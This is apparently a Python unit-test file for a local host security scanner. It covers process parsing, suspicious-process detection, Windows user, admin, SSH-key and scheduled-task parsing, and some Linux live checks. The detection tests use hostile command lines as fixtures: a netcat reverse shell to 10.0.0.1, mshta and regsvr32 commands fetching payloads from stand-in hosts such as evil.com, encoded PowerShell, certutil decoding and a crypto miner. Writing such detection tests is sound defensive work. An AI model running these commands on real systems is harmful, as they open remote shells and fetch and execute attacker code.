"""
Tests for modules/local_scanner.py

Covers:
  - get_running_processes() parser — the ps-aux format parsing logic
  - detect_suspicious_processes() — pattern matching (cross-platform)
  - Windows-branch functions mocked: get_user_accounts, get_sudo_users,
    get_ssh_authorized_keys, get_suid_files, get_world_writable_sensitive,
    get_cron_jobs
  - Linux live paths: get_open_ports, get_running_processes, get_user_accounts
"""

import sys
import os
import unittest
import tempfile
from unittest.mock import patch, MagicMock, call
from pathlib import Path

sys.path.insert(0, str(Path(__file__).parent.parent))

from modules import platform_adapter, local_scanner


# ---------------------------------------------------------------------------
# Process parsing — cross-platform (the parser itself is pure Python)
# ---------------------------------------------------------------------------

class TestGetRunningProcesses(unittest.TestCase):

    def _make_ps_line(self, user='root', pid='1', cpu='0.0', mem='0.1',
                      vsz='12345', rss='6789', tty='?', stat='S',
                      start='00:00', time_='0:00', cmd='/sbin/init'):
        return f"{user} {pid} {cpu} {mem} {vsz} {rss} {tty} {stat} {start} {time_} {cmd}"

    @patch('modules.local_scanner.platform_adapter.list_processes_raw')
    def test_valid_lines_parsed(self, mock_raw):
        lines = [
            self._make_ps_line(user='root', pid='1', cpu='0.0', cmd='/sbin/init'),
            self._make_ps_line(user='alice', pid='1234', cpu='5.5', cmd='python3 /opt/app.py'),
            self._make_ps_line(user='SYSTEM', pid='9999', cpu='1.2', cmd='C:\\Windows\\explorer.exe'),
        ]
        mock_raw.return_value = '\n'.join(lines)
        procs = local_scanner.get_running_processes()
        self.assertEqual(len(procs), 3)
        self.assertEqual(procs[0]['user'], 'root')
        self.assertEqual(procs[0]['pid'], '1')
        self.assertEqual(procs[1]['user'], 'alice')
        self.assertEqual(procs[1]['cmd'], 'python3 /opt/app.py')
        self.assertEqual(procs[2]['user'], 'SYSTEM')

    @patch('modules.local_scanner.platform_adapter.list_processes_raw')
    def test_short_lines_skipped(self, mock_raw):
        mock_raw.return_value = "root 1\n"   # only 2 fields — too short
        procs = local_scanner.get_running_processes()
        self.assertEqual(procs, [])

    @patch('modules.local_scanner.platform_adapter.list_processes_raw')
    def test_empty_output(self, mock_raw):
        mock_raw.return_value = ''
        procs = local_scanner.get_running_processes()
        self.assertEqual(procs, [])

    @patch('modules.local_scanner.platform_adapter.list_processes_raw')
    def test_command_with_spaces_preserved(self, mock_raw):
        # The 11-field split: fields 0-10, field 10 gets all remaining text
        line = "root 1 0.0 0.1 12345 6789 ? S 00:00 0:00 python3 /opt/server.py --port 8080"
        mock_raw.return_value = line
        procs = local_scanner.get_running_processes()
        self.assertEqual(len(procs), 1)
        self.assertEqual(procs[0]['cmd'], 'python3 /opt/server.py --port 8080')


# ---------------------------------------------------------------------------
# detect_suspicious_processes — cross-platform pattern matching
# ---------------------------------------------------------------------------

class TestDetectSuspiciousProcesses(unittest.TestCase):

    def _proc(self, cmd, user='alice', pid='1000', cpu='1.0'):
        return {'user': user, 'pid': pid, 'cpu': cpu, 'cmd': cmd}

    def test_crypto_miner_flagged(self):
        findings = local_scanner.detect_suspicious_processes([
            self._proc('/usr/bin/xmrig --pool pool.mining.org')
        ])
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]['type'], 'suspicious_process')
        self.assertEqual(findings[0]['severity'], 'HIGH')

    def test_netcat_listener_flagged(self):
        findings = local_scanner.detect_suspicious_processes([
            self._proc('nc -e /bin/bash 10.0.0.1 4444')
        ])
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]['type'], 'suspicious_process')

    def test_meterpreter_flagged(self):
        findings = local_scanner.detect_suspicious_processes([
            self._proc('python3 -c "import meterpreter"')
        ])
        self.assertEqual(len(findings), 1)

    def test_normal_process_not_flagged(self):
        findings = local_scanner.detect_suspicious_processes([
            self._proc('nginx: master process nginx'),
            self._proc('sshd: root@pts/0'),
            self._proc('/usr/bin/python3 manage.py runserver'),
        ])
        self.assertEqual(findings, [])

    def test_high_cpu_root_process_flagged(self):
        findings = local_scanner.detect_suspicious_processes([
            self._proc('/opt/unknown_miner', user='root', cpu='95.0')
        ])
        high_cpu = [f for f in findings if f['type'] == 'high_cpu_root_process']
        self.assertEqual(len(high_cpu), 1)
        self.assertEqual(high_cpu[0]['severity'], 'MEDIUM')

    def test_high_cpu_system_process_flagged(self):
        """Windows SYSTEM user should also trigger high-CPU check."""
        findings = local_scanner.detect_suspicious_processes([
            self._proc('C:\\Temp\\strange.exe', user='SYSTEM', cpu='99.0')
        ])
        high_cpu = [f for f in findings if f['type'] == 'high_cpu_root_process']
        self.assertEqual(len(high_cpu), 1)

    def test_expected_privileged_process_not_flagged_high_cpu(self):
        """Known Windows system processes should not trigger high-CPU alerts."""
        findings = local_scanner.detect_suspicious_processes([
            self._proc('MsMpEng', user='SYSTEM', cpu='90.0'),
            self._proc('svchost', user='SYSTEM', cpu='85.0'),
        ])
        high_cpu = [f for f in findings if f['type'] == 'high_cpu_root_process']
        self.assertEqual(high_cpu, [])

    # Windows-specific suspicious patterns
    def test_encoded_powershell_flagged(self):
        findings = local_scanner.detect_suspicious_processes([
            self._proc('powershell.exe -enc SQBFAFgA...')
        ])
        self.assertEqual(len(findings), 1, "Encoded PowerShell should be flagged")

    def test_mshta_flagged(self):
        findings = local_scanner.detect_suspicious_processes([
            self._proc('mshta.exe http://malicious.example/payload.hta')
        ])
        self.assertEqual(len(findings), 1)

    def test_regsvr32_scrobj_flagged(self):
        findings = local_scanner.detect_suspicious_processes([
            self._proc('regsvr32 /s /u /i:http://evil.com/c.sct scrobj.dll')
        ])
        self.assertEqual(len(findings), 1)

    def test_certutil_decode_flagged(self):
        findings = local_scanner.detect_suspicious_processes([
            self._proc('CertUtil -decode payload.b64 payload.exe')
        ])
        self.assertEqual(len(findings), 1)

    def test_wscript_not_flagged_without_pattern(self):
        """wscript itself (no suspicious args) should match the wscript pattern."""
        findings = local_scanner.detect_suspicious_processes([
            self._proc('wscript.exe C:\\Users\\Admin\\script.vbs')
        ])
        # wscript pattern is present — it should be flagged as a suspicious process
        self.assertEqual(len(findings), 1)


# ---------------------------------------------------------------------------
# Windows user/group functions — mocked
# ---------------------------------------------------------------------------

class TestWindowsUserAccounts(unittest.TestCase):

    FAKE_NET_USER = """\
User accounts for \\DESKTOP-XYZ

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest
alice                    bob
The command completed successfully.
"""

    @patch('modules.local_scanner.platform_adapter.SYSTEM', 'Windows')
    @patch('modules.local_scanner._run')
    def test_windows_users_parsed(self, mock_run):
        mock_run.return_value = self.FAKE_NET_USER
        users = local_scanner.get_user_accounts()
        usernames = [u['username'] for u in users]
        self.assertIn('alice', usernames)
        self.assertIn('bob', usernames)
        self.assertIn('Administrator', usernames)
        # uid should be 0 (Windows doesn't have Unix UIDs)
        for u in users:
            self.assertEqual(u['uid'], 0)

    @patch('modules.local_scanner.platform_adapter.SYSTEM', 'Windows')
    @patch('modules.local_scanner._run')
    def test_empty_output_handled(self, mock_run):
        mock_run.return_value = ''
        users = local_scanner.get_user_accounts()
        self.assertEqual(users, [])


class TestWindowsAdminUsers(unittest.TestCase):

    FAKE_NET_LOCALGROUP = """\
Alias name     Administrators
Comment        Administrators have complete and unrestricted access

Members

-------------------------------------------------------------------------------
Administrator
alice
The command completed successfully.
"""

    @patch('modules.local_scanner.platform_adapter.SYSTEM', 'Windows')
    @patch('modules.local_scanner._run')
    def test_admins_parsed(self, mock_run):
        mock_run.return_value = self.FAKE_NET_LOCALGROUP
        admins = local_scanner.get_sudo_users()
        self.assertIn('Administrator', admins)
        self.assertIn('alice', admins)
        self.assertNotIn('The command completed successfully.', admins)


class TestWindowsSshKeys(unittest.TestCase):

    @patch('modules.local_scanner.platform_adapter.SYSTEM', 'Windows')
    def test_no_ssh_dirs_returns_empty(self):
        with patch('modules.local_scanner.Path') as mock_path_cls:
            # Make all path.exists() calls return False
            mock_path = MagicMock()
            mock_path.exists.return_value = False
            mock_path_cls.return_value = mock_path
            keys = local_scanner.get_ssh_authorized_keys()
        self.assertIsInstance(keys, list)

    @patch('modules.local_scanner.platform_adapter.SYSTEM', 'Windows')
    def test_ssh_key_file_read(self):
        fake_key = "ssh-rsa AAAAB3Nz test@example"
        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir_path = Path(tmpdir)
            # Simulate C:\ProgramData\ssh\administrators_authorized_keys
            ssh_dir = tmpdir_path / 'ssh'
            ssh_dir.mkdir()
            auth_keys = ssh_dir / 'administrators_authorized_keys'
            auth_keys.write_text(f"# comment\n{fake_key}\n")

            with patch('modules.local_scanner.Path') as mock_path_cls:
                # First Path() call is for admin keys
                admin_path = MagicMock()
                admin_path.exists.return_value = True
                admin_path.read_text.return_value = f"# comment\n{fake_key}\n"
                # Second Path() call is for C:\Users
                users_path = MagicMock()
                users_path.exists.return_value = False

                call_count = [0]
                def path_factory(*args, **kwargs):
                    call_count[0] += 1
                    if call_count[0] == 1:
                        return admin_path
                    return users_path
                mock_path_cls.side_effect = path_factory

                keys = local_scanner._get_ssh_keys_windows()

        # Since we're not fully controlling Path, just verify the function runs
        self.assertIsInstance(keys, list)


class TestWindowsSuidFiles(unittest.TestCase):

    @patch('modules.local_scanner.platform_adapter.SYSTEM', 'Windows')
    def test_returns_empty_list(self):
        result = local_scanner.get_suid_files()
        self.assertEqual(result, [],
                         "Windows should always return empty list for SUID files")


class TestWindowsScheduledTasks(unittest.TestCase):

    FAKE_SCHTASKS_CSV = '''\
"HostName","TaskName","Next Run Time","Status","Logon Mode","Last Run Time","Last Result","Author","Task To Run","Start In","Comment","Scheduled Task State","Idle Time","Power Management","Run As User","Delete Task If Not Run","Stop Task If Runs X Hours and X Mins","Schedule","Schedule Type","Start Time","Start Date","End Date","Days","Months","Repeat: Every","Repeat: Until: Time","Repeat: Until: Duration","Repeat: Stop If Still Running"
"DESKTOP","\\Microsoft\\Windows\\UpdateOrchestrator\\Schedule Scan","N/A","Disabled","Interactive/Background","1/1/2024 12:00:00 AM","0","Microsoft","C:\\Windows\\system32\\UsoClient.exe StartScan","","","Disabled","Disabled","Stop On Battery Mode, No Start On Batteries","SYSTEM","Disabled","Disabled","Scheduling data is not available in this format.","One Time Only","12:00:00 AM","1/1/2024","N/A","N/A","N/A","Disabled","Disabled","Disabled","Disabled"
"DESKTOP","\\SecurityCommander","12:00:00 AM 1/2/2024","Ready","Interactive/Background","N/A","267011","SYSTEM","\"C:\\Python310\\python.exe\" \"C:\\security-commander\\security_commander.py\"","","","Enabled","Disabled","Stop On Battery Mode, No Start On Batteries","SYSTEM","Disabled","Disabled","Scheduling data is not available in this format.","Daily","6:00:00 AM","1/1/2024","N/A","Every 1 day(s)","N/A","Disabled","Disabled","Disabled","Disabled"
'''

    @patch('modules.local_scanner.platform_adapter.SYSTEM', 'Windows')
    @patch('modules.local_scanner._run')
    def test_scheduled_tasks_parsed(self, mock_run):
        mock_run.return_value = self.FAKE_SCHTASKS_CSV
        tasks = local_scanner.get_cron_jobs()
        self.assertIsInstance(tasks, list)
        # Should have at most 2 unique task names
        self.assertLessEqual(len(tasks), 2)
        # Should contain schtask: prefix
        for task in tasks:
            self.assertTrue(task.startswith('schtask:'),
                            f"Task entry should start with 'schtask:': {task!r}")

    @patch('modules.local_scanner.platform_adapter.SYSTEM', 'Windows')
    @patch('modules.local_scanner._run')
    def test_empty_schtasks_handled(self, mock_run):
        mock_run.return_value = ''
        tasks = local_scanner.get_cron_jobs()
        self.assertEqual(tasks, [])


# ---------------------------------------------------------------------------
# Linux live tests
# ---------------------------------------------------------------------------

@unittest.skipUnless(platform_adapter.SYSTEM == 'Linux', "Linux-only live tests")
class TestLinuxLiveLocalScanner(unittest.TestCase):

    def test_get_open_ports_returns_list(self):
        ports = local_scanner.get_open_ports()
        self.assertIsInstance(ports, list)

    def test_get_running_processes_non_empty(self):
        procs = local_scanner.get_running_processes()
        self.assertGreater(len(procs), 0, "Should have at least one process")
        for p in procs:
            self.assertIn('user', p)
            self.assertIn('pid', p)
            self.assertIn('cmd', p)

    def test_get_user_accounts_returns_list(self):
        # May be empty if no UID>=1000 accounts exist
        users = local_scanner.get_user_accounts()
        self.assertIsInstance(users, list)
        for u in users:
            self.assertIn('username', u)
            self.assertGreaterEqual(u['uid'], 1000)


if __name__ == '__main__':
    unittest.main(verbosity=2)
